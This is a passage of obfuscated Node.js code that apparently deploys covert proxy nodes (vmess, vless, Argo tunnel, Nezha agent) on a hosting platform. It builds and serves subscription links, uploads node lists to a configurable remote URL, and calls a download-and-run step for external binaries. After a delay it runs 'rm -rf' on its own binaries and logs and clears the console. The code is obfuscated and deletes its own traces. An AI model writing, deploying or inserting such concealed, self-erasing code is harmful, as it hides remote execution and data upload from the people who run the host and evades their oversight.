_0x187bfd={_0x3253ea:0x160,_0x45d18c:0x17f,_0x1ee2a9:0x1db,_0xf829e5:0x13f,_0xbfda5c:0x130,_0x5521c8:0x19e},_0x4899a6=await _0x2a5c5e(),_0x2c32b1=NAME?NAME+'-'+_0x4899a6:_0x4899a6;return new Promise(_0x209d50=>{setTimeout(()=>{const _0x24d165={_0x57d304:0x1db,_0x1f6ecd:0x13f,_0x551ec1:0x19e,_0x3ad3b2:0x12f},_0x10697f=_0x2bcb,_0x2e31f1={'v':'2','ps':''+_0x2c32b1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x10697f(0x17b),'net':'ws','type':_0x10697f(0x17b),'host':_0x33b6be,'path':'/vmess-argo?ed=2560','tls':_0x10697f(_0x187bfd._0x3253ea),'sni':_0x33b6be,'alpn':'','fp':'firefox'},_0xf337b3=_0x10697f(0x18a)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x33b6be+'&fp=firefox&type=ws&host='+_0x33b6be+_0x10697f(_0x187bfd._0x45d18c)+_0x2c32b1+_0x10697f(0x1b3)+Buffer[_0x10697f(_0x187bfd._0x1ee2a9)](JSON['stringify'](_0x2e31f1))[_0x10697f(_0x187bfd._0xf829e5)](_0x10697f(0x19e))+_0x10697f(0x173)+UUID+'@'+CFIP+':'+CFPORT+_0x10697f(0x1ce)+_0x33b6be+_0x10697f(0x19d)+_0x33b6be+_0x10697f(_0x187bfd._0xbfda5c)+_0x2c32b1+_0x10697f(0x132);console[_0x10697f(0x157)](Buffer['from'](_0xf337b3)[_0x10697f(_0x187bfd._0xf829e5)](_0x10697f(_0x187bfd._0x5521c8))),fs[_0x10697f(0x180)](subPath,Buffer[_0x10697f(0x1db)](_0xf337b3)['toString'](_0x10697f(_0x187bfd._0x5521c8))),console['log'](FILE_PATH+_0x10697f(0x1ac)),uploadNodes(),app[_0x10697f(0x178)]('/'+SUB_PATH,(_0x4f7c37,_0x4ef514)=>{const _0x3c3640=_0x10697f,_0x4c0d56=Buffer[_0x3c3640(_0x24d165._0x57d304)](_0xf337b3)[_0x3c3640(_0x24d165._0x1f6ecd)](_0x3c3640(_0x24d165._0x551ec1));_0x4ef514['set'](_0x3c3640(0x1a8),_0x3c3640(0x1bb)),_0x4ef514[_0x3c3640(_0x24d165._0x3ad3b2)](_0x4c0d56);}),_0x209d50(_0xf337b3);},0x7d0);});}}async function uploadNodes(){const _0x1b864e={_0x1fbea9:0x1d5,_0x44e549:0x158,_0xe24052:0x157,_0x475f40:0x174,_0x138860:0x1ca,_0x6ec6c0:0x199,_0x1d5f44:0x13d,_0x220907:0x149},_0x2cdbdf=_0x283779;if(UPLOAD_URL&&PROJECT_URL){const _0x1eecbb=PROJECT_URL+'/'+SUB_PATH,_0x3db34a={'subscription':[_0x1eecbb]};try{const _0x2441ca=await axios[_0x2cdbdf(_0x1b864e._0x1fbea9)](UPLOAD_URL+_0x2cdbdf(0x1e0),_0x3db34a,{'headers':{'Content-Type':_0x2cdbdf(0x1d8)}});return _0x2441ca&&_0x2441ca[_0x2cdbdf(_0x1b864e._0x44e549)]===0xc8?(console[_0x2cdbdf(_0x1b864e._0xe24052)]('Subscription\x20uploaded\x20successfully'),_0x2441ca):null;}catch(_0x4bae02){if(_0x4bae02[_0x2cdbdf(_0x1b864e._0x475f40)]){if(_0x4bae02[_0x2cdbdf(0x174)][_0x2cdbdf(0x158)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2cdbdf(_0x1b864e._0x138860)](listPath))return;const _0x2228c8=fs[_0x2cdbdf(0x1b4)](listPath,_0x2cdbdf(0x11f)),_0x4f7c08=_0x2228c8[_0x2cdbdf(_0x1b864e._0x6ec6c0)]('\x0a')['filter'](_0x22b763=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x22b763));if(_0x4f7c08[_0x2cdbdf(_0x1b864e._0x1d5f44)]===0x0)return;const _0x241b11=JSON[_0x2cdbdf(0x14f)]({'nodes':_0x4f7c08});try{const _0x75dab0=await axios['post'](UPLOAD_URL+_0x2cdbdf(0x13a),_0x241b11,{'headers':{'Content-Type':_0x2cdbdf(0x1d8)}});return _0x75dab0&&_0x75dab0[_0x2cdbdf(0x158)]===0xc8?(console['log'](_0x2cdbdf(_0x1b864e._0x220907)),_0x75dab0):null;}catch(_0xb6067a){return null;}}else return;}}function cleanFiles(){const _0x4ca432={_0x4cb6f6:0x15c,_0x25b528:0x15c,_0x40f347:0x187,_0x5136c2:0x172,_0x2b11a3:0x1a7,_0x33ee85:0x1d0,_0x3ca292:0x18b,_0x3b8fd5:0x1d3},_0x9233ea={_0x30c6e2:0x19b,_0x6a346c:0x157,_0x3ef911:0x191};setTimeout(()=>{const _0x2d74d6={_0x1634c9:0x157,_0x2f06a1:0x165,_0x1bc30d:0x157,_0x449530:0x191},_0x178179=_0x2bcb,_0x108bb8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x108bb8[_0x178179(_0x4ca432._0x4cb6f6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x108bb8[_0x178179(_0x4ca432._0x25b528)](phpPath);process[_0x178179(_0x4ca432._0x40f347)]===_0x178179(_0x4ca432._0x5136c2)?exec(_0x178179(_0x4ca432._0x2b11a3)+_0x108bb8[_0x178179(_0x4ca432._0x33ee85)]('\x20')+_0x178179(_0x4ca432._0x3ca292),_0xd98a69=>{const _0x10e8e3=_0x178179;console['clear'](),console[_0x10e8e3(_0x2d74d6._0x1634c9)](_0x10e8e3(_0x2d74d6._0x2f06a1)),console[_0x10e8e3(_0x2d74d6._0x1bc30d)](_0x10e8e3(_0x2d74d6._0x449530));}):exec('rm\x20-rf\x20'+_0x108bb8[_0x178179(_0x4ca432._0x33ee85)]('\x20')+_0x178179(_0x4ca432._0x3b8fd5),_0x49d44c=>{const _0x1666b2=_0x178179;console[_0x1666b2(_0x9233ea._0x30c6e2)](),console[_0x1666b2(_0x9233ea._0x6a346c)](_0x1666b2(0x165)),console[_0x1666b2(0x157)](_0x1666b2(_0x9233ea._0x3ef911));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34f2a6={_0x5bfa57:0x129,_0x852f59:0x16f,_0x5cd4a0:0x14e},_0xb49a35=_0x283779;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xb49a35(0x157)](_0xb49a35(_0x34f2a6._0x5bfa57));return;}try{const _0x295912=await axios['post'](_0xb49a35(0x1a2),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0xb49a35(_0x34f2a6._0x852f59)),_0x295912;}catch(_0x3b6303){return console['error'](_0xb49a35(_0x34f2a6._0x5cd4a0)+_0x3b6303[_0xb49a35(0x1af)]),null;}}async function startserver(){const _0x8a06be={_0x3ee542:0x13e},_0x3513e4=_0x283779;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2813ec){console[_0x3513e4(_0x8a06be._0x3ee542)](_0x3513e4(0x156),_0x2813ec);}}startserver()['catch'](_0x2a380b=>{const _0x5c9eed={_0x3ab15b:0x13e,_0x8e6421:0x1d2},_0x305ab4=_0x283779;console[_0x305ab4(_0x5c9eed._0x3ab15b)](_0x305ab4(_0x5c9eed._0x8e6421),_0x2a380b);}),app[_0x283779(0x178)]('/',async function(_0x2a41cd,_0x52e07a){const _0x31ddd7={_0x5b9fb7:0x1d0,_0x508421:0x146,_0x337a61:0x14d,_0x4ed3d3:0x12f,_0x5596e6:0x18f},_0x3497dc=_0x283779;try{const _0x41b572=path[_0x3497dc(_0x31ddd7._0x5b9fb7)](__dirname,_0x3497dc(_0x31ddd7._0x508421)),_0x3e10b1=await fs['promises']['readFile'](_0x41b572,_0x3497dc(_0x31ddd7._0x337a61));_0x52e07a[_0x3497dc(0x12f)](_0x3e10b1);}catch(_0x8477d9){_0x52e07a[_0x3497dc(_0x31ddd7._0x4ed3d3)](_0x3497dc(_0x31ddd7._0x5596e6));}}),app['listen'](PORT,()=>console[_0x283779(0x157)](_0x283779(0x148)+PORT+'!'));
